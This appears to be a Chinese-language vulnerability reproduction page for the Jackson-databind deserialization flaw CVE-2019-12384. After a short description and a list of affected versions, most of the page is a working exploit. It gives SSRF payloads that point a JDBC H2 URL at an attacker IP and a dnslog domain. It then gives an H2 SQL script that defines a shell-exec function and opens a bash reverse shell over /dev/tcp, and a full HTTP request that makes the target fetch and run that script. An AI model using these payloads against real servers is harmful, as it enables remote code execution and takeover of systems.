# Jackson-databind 远程代码执行 CVE-2019-12384

## 漏洞描述

多个 Redhat 产品受此漏洞影响，CVSS 评分为 8.1，漏洞利用复杂度高。

该漏洞是由于 Jackson 黑名单过滤不完整而导致，当开发人员在应用程序中通过 ObjectMapper 对象调用 enableDefaultTyping 方法时，程序就会受到此漏洞的影响，攻击者就可利用构造的包含有恶意代码的 json 数据包对应用进行攻击，直接获取服务器控制权限。

## 漏洞影响

受影响版本：

```
Jackson-databind 2.X < 2.9.9.1
```

不受影响版本：

```
Jackson-databind 2.9.9.1
Jackson-databind 2.10
```

## 漏洞复现

### SSRF

```
POST /fuckme HTTP/1.1
Host: 192.168.136.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://192.168.136.129:7777/"}]
```

或者直接使用 dnslog 验证：

```
poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://jcqfpe.dnslog.cn/"}]
```

### RCE

首先在 vps 上放置一个.sql 的文件，内容如下：

```sql
CREATE ALIAS SHELLEXEC AS $ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$;
CALL SHELLEXEC('bash -i >& /dev/tcp/192.168.136.129/7777 0>&1')
```

然后发送 payload，请求远程的 sql 文件，进行 RCE

```
POST /fuckme HTTP/1.1
Host: 192.168.136.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 164

poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.136.129/exp.sql'"}]

```
